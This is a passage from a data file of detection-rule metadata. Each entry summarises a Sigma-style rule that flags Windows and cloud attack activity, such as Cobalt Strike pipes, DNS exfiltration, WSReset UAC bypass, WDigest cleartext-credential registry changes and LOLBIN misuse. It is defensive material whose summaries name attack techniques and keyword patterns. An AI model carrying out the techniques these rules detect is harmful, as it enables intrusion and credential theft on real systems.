  Rule-Body-Hash: d7c0eff59568d0171e1f7cc60a3ca5f3
  Ruleset: emerging-threats
  Summary: This rule detects the use of a specific export function name, 'dll_u',
    which is associated with tools utilized by the Equation Group. The detection focuses
    on command lines that either contain or end with the string '-export dll_u' or
    variations of ',dll_u' and ' dll_u'. The Equation Group is known for advanced
    cyber espionage operations and the use of this unique export function name can
    be indicative of their malware or tools being used within a Windows environment.
    The rule flags this behavior as critical due to the high likelihood of malicious
    activity when this export function is observed.
  Updated-Date: '2024_09_03'
d4a11f63-2390-411c-9adf-d791fd152830:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 71799edd38a1723bf344638344ebcc31
  Ruleset: sigmahq
  Summary: This rule detects attempts to capture screenshots on a Windows system using
    the 'CopyFromScreen' method. Adversaries may employ this technique to collect
    information during an operation, often utilizing remote access tools that include
    screen capturing as a feature.
  Updated-Date: '2024_09_04'
d4c7758e-9417-4f2e-9109-6125d66dabef:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a790b44e78936013554ef3221407b9e5
  Ruleset: sigmahq
  Summary: This rule detects modifications and updates to user risk and multi-factor
    authentication (MFA) registration policies. These changes can be indicative of
    attackers attempting to bypass MFA, weaken security settings, facilitate further
    attacks, or maintain persistence within the system.
  Updated-Date: '2024_09_04'
d4ca7c59-e9e4-42d8-bf57-91a776efcb87:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e9ddfc1b02c7476a8c889bf151d6f151
  Ruleset: sigmahq
  Summary: This rule detects Living Off the Land Binaries (LOLBINs) executing from
    abnormal or uncommon drives, such as a mounted ISO or other non-standard locations.
    The rule specifically monitors for the execution of well-known binaries like calc.exe,
    certutil.exe, cmstp.exe, cscript.exe, installutil.exe, mshta.exe, regsvr32.exe,
    rundll32.exe, and wscript.exe from these unusual locations. The intent is to identify
    potential misuse of these binaries for malicious purposes, such as in the distribution
    and execution of ransomware like Diavol, or other threats like Qakbot and Bumblebee.
  Updated-Date: '2024_09_04'
d4e2745c-f0c6-4bde-a3ab-b553b3f693cc:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: c2f25700c3899dea80085ce12ad6803d
  Ruleset: sigmahq
  Summary: This rule detects modifications to the Disk Cleanup Handler values in the
    Windows registry that are used by an attacker to achieve persistence through autorun.
    The Disk Cleanup Manager, a component of the Windows operating system, is designed
    to be flexible and extensible, allowing developers to implement and register custom
    disk cleanup handlers. The detection focuses on specific registry paths related
    to volume caches and checks for specific actions such as the addition of autorun
    entries and the use of commands like 'cmd', 'powershell', 'rundll32', among others.
    The rule aims to identify suspicious activities that leverage the Disk Cleanup
    Manager for persistence.
  Updated-Date: '2024_09_04'
d4f4e0be-cf12-439f-9e25-4e2cdcf7df5a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 121140a916addb014d67dd5ac24c69d6
  Ruleset: sigmahq
  Summary: This rule detects modifications to the registry values associated with
    the Disk Cleanup Handler in Windows systems, which attackers may exploit to achieve
    persistence. The Disk Cleanup Handler is part of the Windows operating system
    and is designed to allow developers to register their own cleanup handlers. These
    modifications can indicate that an attacker is attempting to utilize this feature
    to maintain a presence on the system. The rule filters out default keys associated
    with legitimate Disk Cleanup Handlers but highlights any new or unauthorized entries
    that could signify a potential compromise.
  Updated-Date: '2024_09_04'
d51694fe-484a-46ac-92d6-969e76d60d10:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a0fa4af224e420e7e848d2bae891b20a
  Ruleset: sigmahq
  Summary: This rule detects file access requests to potentially sensitive files hosted
    on the Windows Sysvol share, specifically targeting files within the Sysvol directory
    under Policies. The monitored files include audit.csv, Files.xml, GptTmpl.inf,
    groups.xml, Registry.pol, Registry.xml, scheduledtasks.xml, scripts.ini, and services.xml.
    The rule filters out access attempts originating from common system and program
    files directories such as Program Files, Program Files (x86), Windows\system32,
    Windows\SysWOW64, and access via C:\Windows\explorer.exe. This ensures that the
    detection focuses on uncommon applications attempting to access these potentially
    sensitive Sysvol files.
  Updated-Date: '2024_09_04'
d522eca2-2973-4391-a3e0-ef0374321dae:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7bfe54b00fd332aa2488ae7b73386a88
  Ruleset: core
  Summary: This rule detects the potential abuse of debug privileges by monitoring
    for unusual child processes launched by specific system processes such as winlogon.exe,
    services.exe, lsass.exe, csrss.exe, smss.exe, wininit.exe, spoolsv.exe, and searchindexer.exe.
    The rule targets instances where these parent processes are used to execute command-line
    interfaces like powershell.exe, pwsh.exe, or cmd.exe. It specifically filters
    out legitimate commands, focusing on suspicious command lines to identify possible
    privilege escalation activities within a Windows environment.
  Updated-Date: '2024_09_03'
d52d2e87-eb03-4fac-961d-eb616da79788:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d6183e366247c84502c29d9ea828aaca
  Ruleset: emerging-threats
  Summary: "This rule detects the subsequent execution of commands related to the\
    \ Raspberry Robin malware on Windows systems. Raspberry Robin, detailed by Red\
    \ Canary, utilizes legitimate Windows utilities such as 'fodhelper.exe', 'rundll32.exe',\
    \ and 'regsvr32.exe' for executing commands like 'odbcconf.exe' with specific\
    \ parameters ('regsvr', 'shellexec_rundll', 'installdriver', 'setfiledsndir',\
    \ 'vkipdse') and command line endings ('/a', '/f', '/s'). This detection is focused\
    \ on identifying the malicious use of these utilities to execute the malware\u2019\
    s payload."
  Updated-Date: '2024_09_03'
d54c2f06-aca9-4e2b-81c9-5317858f4b79:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bae2cde5a1803128ae2998e9583446fe
  Ruleset: sigmahq
  Summary: This rule detects the execution of the "esxcli" command with the "vsan"
    flag on Linux systems, indicating attempts to retrieve information about virtual
    storage. The use of "esxcli vsan" commands has been observed in association with
    malware such as DarkSide. Specifically, the commands "get" or "list" used with
    "vsan" are monitored, which may be part of legitimate administrative tasks or
    malicious discovery activities.
  Updated-Date: '2024_09_04'
d557dc06-62e8-4468-a8e8-7984124908ce:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6e921208c4ae94b7e3079c77ca2e726c
  Ruleset: sigmahq
  Summary: This rule detects command-line keywords indicative of the potential use
    of WinPwn, a tool used for Windows and Active Directory reconnaissance and exploitation.
    It monitors for specific patterns in process creation, such as references to 'Offline_Winpwn',
    'WinPwn', 'WinPwn.exe', and 'WinPwn.ps1'.
  Updated-Date: '2024_09_04'
d55b793d-f847-4eea-b59a-5ab09908ac90:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 04075d68a34d85003b4f47413d6e403e
  Ruleset: core
  Summary: This rule detects suspicious child processes originating from the Veeam
    service to identify potential Remote Code Execution (RCE) or SQL Injection attempts.
    It specifically monitors for processes created by the `sqlservr.exe` with the
    `VEEAMSQL` command line that spawn child processes such as `cmd.exe`, `powershell.exe`,
    `pwsh.exe`, `wsl.exe`, and `wt.exe`, particularly if their command lines contain
    suspicious keywords like '-ex', 'bypass', 'cscript', 'DownloadString', 'http://',
    'https://', 'mshta', 'regsvr32', 'rundll32', 'wscript', or 'copy'. Additionally,
    it looks for child processes like `net.exe`, `net1.exe`, `netstat.exe`, `nltest.exe`,
    `ping.exe`, `tasklist.exe`, and `whoami.exe`. Detecting these patterns suggests
    potential malicious activity within a Windows environment that involves Veeam
    services.
  Updated-Date: '2024_09_03'
d5601f8c-b26f-4ab0-9035-69e11a8d4ad2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 603f8d70b5c2658c785084db5e3eac45
  Ruleset: core
  Summary: This rule detects the creation of specific named pipes associated with
    CobaltStrike, a popular post-exploitation toolkit used for attack simulations
    and by malicious actors. The detection is based on the naming patterns of the
    pipes, such as those starting with "\postex_", "\status_", "\msagent_", "\mojo_",
    "\interprocess_", "\samr_", "\netlogon_", "\srvsvc_", "\lsarpc_", and "\wkssvc_",
    as well as those containing "\MSSE-" and ending with "-server". This helps identify
    potential malicious activities where CobaltStrike might be employed to escalate
    privileges, evade defenses, or conduct other nefarious operations.
  Updated-Date: '2024_09_03'
d5866ddf-ce8f-4aea-b28e-d96485a20d3d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a89b7bd674539e57db8977b1e1567ad2
  Ruleset: sigmahq
  Summary: This rule detects the creation of executables bearing names of known system
    processes in directories other than typical system folders like System32 or SysWOW64.
    System process names such as `cmdl32.exe`, `services.exe`, and `explorer.exe`
    are examples. This behavior can indicate potential malicious activity, where malware
    might disguise itself using these system names to evade detection. The rule includes
    filters to exclude legitimate scenarios, such as software installations or updates
    using `msiexec.exe`, and processes like `wuauclt.exe` and `svchost.exe` running
    from their correct paths. False positives might occur due to system processes
    being copied outside their default locations for testing or third-party software
    naming their executables similarly.
  Updated-Date: '2024_09_04'
d58ba5c6-0ed7-4b9d-a433-6878379efda9:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3c78ed3d3b68887baca989105fe8e55f
  Ruleset: sigmahq
  Summary: This rule detects incoming connections to AnyDesk, a remote access software.
    Such activity might indicate a potential remote attacker attempting to connect
    to a listening instance of AnyDesk, using it as a possible command and control
    channel.
  Updated-Date: '2024_09_04'
d59d7842-9a21-4bc6-ba98-64bfe0091355:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 58e85db926cea454ab6fa3e0d3df52e0
  Ruleset: core
  Summary: This rule detects the use of PowerShell scripts that attempt to exfiltrate
    files using the DNSExfiltrator tool. DNSExfiltrator enables the covert transfer
    of files via DNS request channels. The detection focuses on identifying PowerShell
    ScriptBlockText containing the command 'Invoke-DNSExfiltrator' and parameters
    such as '-i', '-d', '-p', '-doh', and '-t'. The rule helps in identifying potential
    malicious activity involving data exfiltration through DNS by leveraging the capabilities
    of DNSExfiltrator.
  Updated-Date: '2024_09_03'
d5b9ae7a-e6fc-405e-80ff-2ff9dcc64e7e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f95f49e0edad4be0dd47af141fdf4576
  Ruleset: sigmahq
  Summary: This rule detects the initiation of the Sysprep process targeted at the
    AppData folder, which is a behavior linked to the Trojan Syndicasec as highlighted
    in the Thrip report by Symantec.
  Updated-Date: '2024_09_04'
d5eb7432-fda4-4bba-a37f-ffa74d9ed639:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2b41c18d229e69e9e16b9d3886a75acb
  Ruleset: emerging-threats
  Summary: "This rule detects the execution of the Serpent backdoor\u2014malware known\
    \ for targeting French entities\u2014via a scheduled task. The backdoor creates\
    \ a temporary scheduled task triggered by a fictitious Windows event, thereby\
    \ executing the payload using an unconventional method. The detection looks for\
    \ commands involving cmd.exe or powershell.exe that include specific command line\
    \ options related to event creation, task scheduling, and task deletion."
  Updated-Date: '2024_09_03'
d6266bf5-935e-4661-b477-78772735a7cb:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0d9747e409bed22bcd394dc522d0f23b
  Ruleset: emerging-threats
  Summary: This rule detects the exploitation of a Microsoft Exchange vulnerability
    (CVE-2020-0688) by identifying specific error events in the Windows Application
    log. The vulnerability involves exploitation through the Microsoft Exchange Control
    Panel service, as indicated by events with EventID 4 and errors that match certain
    criteria.
  Updated-Date: '2024_09_03'
d635249d-86b5-4dad-a8c7-d7272b788586:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f8519aa1da30fce71c8a231dd34d1598
  Ruleset: sigmahq
  Summary: This rule detects a Background Intelligent Transfer Service (BITS) transfer
    job that downloads files from file-sharing domains. BITS is a Microsoft service
    for transferring files and data between a client and a server, typically utilized
    for tasks such as downloading updates. The rule monitors EventID 16403, which
    corresponds to network traffic related to BITS activities, and flags remote names
    indicative of common file-sharing services. Some of the domains monitored include
    githubusercontent.com, anonfiles.com, cdn.discordapp.com, dropboxusercontent.com,
    mediafire.com, mega.nz, and others. This rule aims to identify potentially suspicious
    or unauthorized file downloads that could indicate malicious activities like data
    exfiltration or the transfer of malware.
  Updated-Date: '2024_09_04'
d65aee4d-2292-4cea-b832-83accd6cfa43:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b43cec838647d8c9c0f0ae1f41c09630
  Ruleset: sigmahq
  Summary: "This rule detects the execution of the Notepad++ updater utility (gup.exe)\
    \ to launch other commands or executables, potentially indicating misuse for running\
    \ arbitrary binaries. The focus is on identifying instances where gup.exe invokes\
    \ explorer.exe with a command line containing the path to notepad++.exe, while\
    \ excluding standard updater processes originating from Notepad++\u2019s updater\
    \ directory and cases where the command line is null. The rule helps highlight\
    \ unusual activity that may be part of an execution tactic in an attack."
  Updated-Date: '2024_09_04'
d65f37da-a26a-48f8-8159-3dde96680ad2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2a50e15c530fc54cb11433fabcc29f1c
  Ruleset: core
  Summary: This rule detects process execution-related exceptions in JVM-based applications.
    Such exceptions often relate to remote code execution (RCE) vulnerabilities. It
    monitors application error logs for specific error messages such as "Cannot run
    program," "java.lang.ProcessImpl," and "java.lang.ProcessBuilder." These logs
    must be collected at an error log level or higher to ensure accurate detection.
    While these detections can sometimes indicate legitimate application bugs, they
    are treated with a high-level alert due to their potential security implications.
  Updated-Date: '2024_09_03'
d67572a0-e2ec-45d6-b8db-c100d14b8ef2:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3021da86f0d0a9a696b8a04164eed787
  Ruleset: core
  Summary: This rule detects a NetNTLM downgrade attack by monitoring specific registry
    changes in the Windows operating system. It looks for modifications to keys within
    system control settings related to Local Security Authority (LSA) policies, particularly
    those affecting LM compatibility level, minimum client security for NTLM, and
    restrictions on sending NTLM traffic. Such changes can indicate an attempt to
    weaken or bypass NTLM security protocols, allowing for potential misuse and exploitation.
  Updated-Date: '2024_09_03'
d679950c-abb7-43a6-80fb-2a480c4fc450:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e7214bda2c47ec814f9e76d76ae90e1b
  Ruleset: sigmahq
  Summary: This rule detects the use of the PDQ Deploy remote administration tool
    by monitoring for the execution of the PDQDeployConsole.exe process on Windows
    systems. PDQ Deploy is a software deployment tool used for automating software
    installations and updates across multiple computers within a network. The rule
    identifies processes that match specific characteristics such as the description,
    product name, and company associated with PDQ Deploy. While there may be legitimate
    usages of this tool, the rule helps identify potential misuse or unauthorized
    deployment activities indicative of lateral movement or execution tactics.
  Updated-Date: '2024_09_04'
d6a9b252-c666-4de6-8806-5561bbbd3bdc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 19af0d9e1adb625d3398231c44d2a5ea
  Ruleset: core
  Summary: This rule detects potential unauthorized modifications to the registry
    property value of UseLogonCredential located at HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest.
    The modification enables clear-text credentials, which could indicate a security
    breach.
  Updated-Date: '2024_09_03'
d6b5520d-3934-48b4-928c-2aa3f92d6963:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b31d3659b7c249aefd8e2373f4b05f63
  Ruleset: core
  Summary: This rule detects the termination of critical or significant Windows services,
    such as antivirus solutions, firewalls, encryption services, and other security-related
    applications. It monitors events logged by the Service Control Manager, specifically
    focusing on Event ID 7023, which indicates a service termination error. The rule
    is designed to identify terminations associated with services like Microsoft Defender,
    Windows Defender Firewall, BitLocker Drive Encryption Service, Encrypting File
    System, and others, capturing both display name and binary values. It is particularly
    valuable for identifying potential defense evasion tactics employed by malicious
    actors.
  Updated-Date: '2024_09_03'
d6c2ce7e-afb5-4337-9ca4-4b5254ed0565:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: bdf7daec9b05b0263dd53ea953612d23
  Ruleset: sigmahq
  Summary: This rule detects the modification of autostart extensibility points (ASEPs)
    in the Windows registry, specifically focusing on the WinSock2 parameters. These
    modifications may include changes to the `Protocol_Catalog9\Catalog_Entries` and
    `NameSpace_Catalog5\Catalog_Entries` registry keys. Adjustments to these keys
    can indicate the presence of malware attempting to achieve persistence by automatically
    starting up with the operating system. The rule filters out known legitimate processes
    such as `MsiExec.exe` from both `System32` and `syswow64` directories, as these
    can modify these keys during legitimate software installations.
  Updated-Date: '2024_09_04'
d6ce7ebd-260b-4323-9768-a9631c8d4db2:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 13d2efe133122c9d84c94b830da0c0fc
  Ruleset: core
  Summary: This rule detects changes to the "DisableRestrictedAdmin" registry value,
    which controls the status of RestrictedAdmin mode in Windows. RestrictedAdmin
    mode is designed to prevent the transmission of reusable credentials to remote
    systems accessed via Remote Desktop, thereby protecting credentials from being
    harvested if the remote server is compromised. Changes to this registry setting
    could indicate an attempt to disable this protective feature.
  Updated-Date: '2024_09_03'
d6d9d23f-69c1-41b5-8305-fa8250bd027f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9aa63e7cbd900d84d9f55c9ad12badaf
  Ruleset: emerging-threats
  Summary: This rule detects the presence of the SNAKE malware by identifying a specific
    kernel driver file indicator on a Windows system. SNAKE malware is a sophisticated
    cyber espionage tool, and this rule focuses on the detection of the file 'C:\Windows\System32\Com\Comadmin.dat'
    to signify potential infection.
  Updated-Date: '2024_09_03'
d75d6b6b-adb9-48f7-824b-ac2e786efe1f:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05ce202d517a8d0e67ce5489fd5adaa0
  Ruleset: sigmahq
  Summary: This rule detects attempts to decode a base64 Gzip archive using PowerShell.
    Such activity often indicates efforts to load malicious content into memory. The
    detection focuses on specific PowerShell command-line arguments that include 'FromBase64String',
    'MemoryStream', and 'H4sI', which are commonly used in this technique. While legitimate
    administrative scripts might trigger this rule, it primarily aims to identify
    command-and-control attacks leveraging this method.
  Updated-Date: '2024_09_04'
d7654f02-e04b-4934-9838-65c46f187ebc:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3073f2d51920c58ef18acd9282195b03
  Ruleset: core
  Summary: This rule detects the execution of IOX, a tool designed for port forwarding
    and intranet proxy purposes. It identifies the presence of the IOX executable
    (`iox.exe`) through specific command line parameters indicative of forwarding
    or proxy operations, such as '.exe fwd -l', '.exe fwd -r', '.exe proxy -l', and
    '.exe proxy -r'. Additionally, it matches known cryptographic hashes for the executable
    to confirm the tool's use.
  Updated-Date: '2024_09_03'
d7662ff6-9e97-4596-a61d-9839e32dee8d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f96648d6ea07481057fe69ad5fd8a6d5
  Ruleset: core
  Summary: This rule detects the execution of "reg.exe" commands with the "add" or
    "copy" flags on Safe Boot registry keys. This technique is often utilized by attackers
    to enable ransomware to operate in safe mode, bypassing some security products
    that might not be active in that mode.
  Updated-Date: '2024_09_03'
d7821ff1-4527-4e33-9f84-d0d57fa2fb66:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 30a7bfd1e5748b0ae8a3f1b4a8ecefee
  Ruleset: sigmahq
  Summary: This rule detects events where the contents of history files, such as .bash_history
    or .zsh_history, are printed to the command line or redirected to a file. This
    activity is indicative of reconnaissance efforts, where an adversary may be attempting
    to gather information on previously executed commands. The rule monitors process
    creation associated with commands like 'cat', 'head', 'tail', and 'more', which
    are used to read or display file contents.
  Updated-Date: '2024_09_04'
d78b5d61-187d-44b6-bf02-93486a80de5a:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 41d4b3be51fd0b9c080d72e96a1c92ac
  Ruleset: core
  Summary: This rule detects the use of the Dinject PowerShell cradle by identifying
    specific command-line flags such as '/am51' and '/password'. Dinjector is a tool
    used primarily for defense evasion and process injection by harnessing PowerShell
    scripts. The detection focuses on these distinct flags to signal potentially malicious
    activity, indicating usage of the Dinjector tool.
  Updated-Date: '2024_09_03'
d797268e-28a9-49a7-b9a8-2f5039011c5c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9eaf659a3dca0532e48434b3ea6b173f
  Ruleset: core
  Summary: This rule detects the use of WSReset.exe to bypass User Account Control
    (UAC). Adversaries leverage this technique to run processes with elevated privileges
    without triggering a UAC prompt. WSReset.exe is a legitimate tool in Windows that
    resets the Windows Store, but it can be exploited for unauthorized privilege escalation.
    The rule identifies instances where WSReset.exe is the parent process, excluding
    cases associated with legitimate child processes like conhost.exe.
  Updated-Date: '2024_09_03'
d7a95147-145f-4678-b85d-d1ff4a3bb3f6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6bbaebf40f92861fb76de92a3f68b04c
  Ruleset: core
  Summary: This rule detects malicious service installations associated with instances
    where a Cobalt Strike beacon, a versatile post-exploitation tool, elevates privileges
    or conducts lateral movement within a network. It focuses on identifying specific
    patterns within the service file names and command executions that are indicative
    of such activities. Detection criteria include service file names containing elements
    like 'ADMIN$', '.exe', '%COMSPEC%', 'start', 'powershell', and certain encoded
    PowerShell commands.
  Updated-Date: '2024_09_03'
d7b50671-d1ad-4871-aa60-5aa5b331fe04:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aa8cdbe338100613567233a78cf95b68
  Ruleset: core
  Summary: This rule detects the creation of suspicious files and folders within the
    user's AppData folder, specifically excluding well-known directories such as Local,
    Roaming, and LocalLow. It targets several file types often associated with malicious
    activities, including those with extensions like .bat, .cmd, .dll, .exe, .msi,
    .ps1, and others. The detection aims to identify attempts to bypass standard security
    measures that overlook the AppData folder to avoid false positives, suggesting
    a potential method for defense evasion and execution by attackers.
  Updated-Date: '2024_09_03'
d7bcd677-645d-4691-a8d4-7a5602b780d1:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 09830c909967b6eee9955620adbf22b7
  Ruleset: core
  Summary: This rule detects potential PowerShell command line obfuscation by identifying
    the use of special characters in PowerShell commands, such as repeated instances
    of plus signs, curly braces, carets, or backticks. This behavior is often associated
    with techniques for hiding malicious intent and evading security detections. The
    rule looks for the execution of PowerShell executables ('powershell.exe' or 'pwsh.exe')
    or their respective original file names containing these patterns, while excluding
    certain benign scenarios like operations carried out by Amazon SSM Document Worker
    or Windows Defender ATP.
  Updated-Date: '2024_09_03'
d7eab125-5f94-43df-8710-795b80fa1189:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: d3d78a4db4a8dc7c0d5111672762d440
  Ruleset: sigmahq
  Summary: This rule detects a risky sign-in attempt in Microsoft 365 identified by
    Microsoft Cloud App Security due to an 'Impossible Travel Activity.' This activity
    occurs when a user logs in from geographically distant locations in a time frame
    that would be impossible to travel, indicating potential unauthorized access or
    credential compromise. The log source for this detection is the Security Compliance
    Center, and the event name associated with it is 'Impossible travel activity'
    with a successful status.
  Updated-Date: '2024_09_04'
d7eb979b-c2b5-4a6f-a3a7-c87ce6763819:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 219db3420191cea551a02a605f67e83f
  Ruleset: core
  Summary: This rule detects suspicious execution of Rundll32.exe initiated by Control.exe,
    which is indicative of potential exploitation by the Equation Group and various
    exploit kits. The specific behavior involves checking for processes where the
    parent image is Control.exe, and the image is Rundll32.exe or has 'RUNDLL32.EXE'
    as the original file name, excluding instances where the command line contains
    'Shell32.dll'.
  Updated-Date: '2024_09_03'
d807056b-0e00-4cec-b7f8-b8b7518e382b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: dd605a6a0ffedf546b8018fde1849fb2
  Ruleset: emerging-threats
  Summary: This rule detects the setting of a DLL that handles a custom protocol handler,
    specifically in the Windows registry. This activity has been linked to the Forest
    Blizzard APT group, which uses this method as a part of their persistence techniques.
    According to a detailed analysis by Microsoft, this custom protocol handler is
    used in post-compromise scenarios for exploiting vulnerabilities to obtain credentials.
    The detection criteria focus on specific registry paths and DLL file extensions.
  Updated-Date: '2024_09_03'
d80d5c81-04ba-45b4-84e4-92eba40e0ad3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1244fac5966123af86b46c900cc2a67e
  Ruleset: sigmahq
  Summary: This rule detects the execution of arbitrary DLL files or unsigned code
    through ".csproj" files via the Dotnet.EXE program. It observes if Dotnet.EXE
    is invoked and checks if the command line ends with extensions associated with
    C# project files or DLLs. The activity could indicate attempts to evade security
    defenses by executing unauthorized code or bypassing application whitelisting
    mechanisms.
  Updated-Date: '2024_09_04'
d81871ef-5738-47ab-9797-7a9c90cd4bfb:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0b46912fdd8ed0e739b9bca45a1f2b9b
  Ruleset: sigmahq
  Summary: This rule detects the execution of PHP scripts using the "-r" command-line
    flag on Windows systems. The "-r" flag can be used to run arbitrary PHP code directly
    from the command line, which attackers may utilize to launch reverse shells or
    execute live PHP code for malicious purposes. By monitoring for the presence of
    'php.exe' in process creation logs and checking if the command line contains '
    -r', suspicious PHP usage can be identified.
  Updated-Date: '2024_09_04'
d84c0ded-edd7-4123-80ed-348bb3ccc4d5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2a5f5270a181df1317426e3ecce8244e
  Ruleset: sigmahq
  Summary: This rule detects suspicious SQL query keywords commonly associated with
    reconnaissance, data exfiltration, or destructive activities. The targeted keywords
    include actions such as dropping tables, truncating tables, dumping databases,
    and selecting all fields using wildcards. Such behaviors are flagged as potentially
    malicious since they can indicate attempts to compromise data integrity or unauthorized
    data access. However, these activities may also be seen in legitimate use cases
    like inventory monitoring, vulnerability scanning, or normal operations by authorized
    applications.
  Updated-Date: '2024_09_04'
d85873ef-a0f8-4c48-a53a-6b621f11729d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e02d57b05885cc5bb2eb65f611df79ab
  Ruleset: sigmahq
  Summary: This rule detects the execution of LogMeIn, a legitimate remote access
    tool, by identifying processes associated with the LMIGuardianSvc description,
    product, and company. LogMeIn is often used by adversaries to establish an interactive
    command and control channel on target systems while masquerading as technical
    support software. This detection specifically looks for markers associated with
    LogMeIn to identify potential unauthorized remote access attempts within a network.
  Updated-Date: '2024_09_04'
d87bd452-6da1-456e-8155-7dc988157b7d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: cb0a7c04cb7fce4a2a67a33d7cc4f067
  Ruleset: core
  Summary: This rule detects suspicious usage of the ShellExec_RunDLL function, which
    is commonly exploited to launch other commands. This behavior has been associated
    with the Raspberry Robin attack. Indicators include specific command lines containing
    'ShellExec_RunDLL' in conjunction with commands typically used for malicious activity,
    such as 'regsvr32', 'msiexec', paths like '\Users\Public\', '\Desktop\', or '\Temp\',
    and other potentially harmful scripts or executables.
  Updated-Date: '2024_09_03'
d8937fe7-42d5-4b4d-8178-e089c908f63f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4229eee331c4ea3d570fb8cea1692b5a
  Ruleset: emerging-threats
  Summary: This rule detects the execution of rundll32 that leads to the invocation
    of legitimate Windows binaries, a technique used by the malware Pikabot for process
    hollowing through hard-coded Windows binaries. It specifically looks for parent
    processes ending with rundll32.exe and child processes ending with well-known
    binaries such as SearchFilterHost.exe, SearchProtocolHost.exe, sndvol.exe, wermgr.exe,
    and wwahost.exe. An exception is made for the legit execution of sndvol.exe triggered
    by mmsys.cpl.
  Updated-Date: '2024_09_03'
d8b0a4fe-07a8-41be-bd39-b14afa025d95:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 001a21f32af9878b370eeefced0ab13a
  Ruleset: sigmahq
  Summary: This rule detects instances where Microsoft Cloud App Security reports
    user activity originating from IP addresses identified as anonymous proxy IP addresses.
  Updated-Date: '2024_09_04'
d8ffe17e-04be-4886-beb9-c1dd1944b9a8:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 004c4220afee1b70267de0bd78e37d98
  Ruleset: core
  Summary: This rule detects remote RPC calls that gather information through the
    Remote Registry Protocol. It is designed to identify specific event logs generated
    by the RPC Firewall, with a focus on a particular interface UUID. The rule filters
    out certain operation numbers to reduce false positives and is aimed at detecting
    potentially malicious remote registry reconnaissance activities.
  Updated-Date: '2024_09_03'
d9047477-0359-48c9-b8c7-792cedcdc9c4:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d7e25ee618421ac53acf31a35d057c8
  Ruleset: core
  Summary: This rule detects the execution of the NirCmd tool with the 'runassystem'
    command, indicating use as the SYSTEM user. NirCmd is a command-line utility for
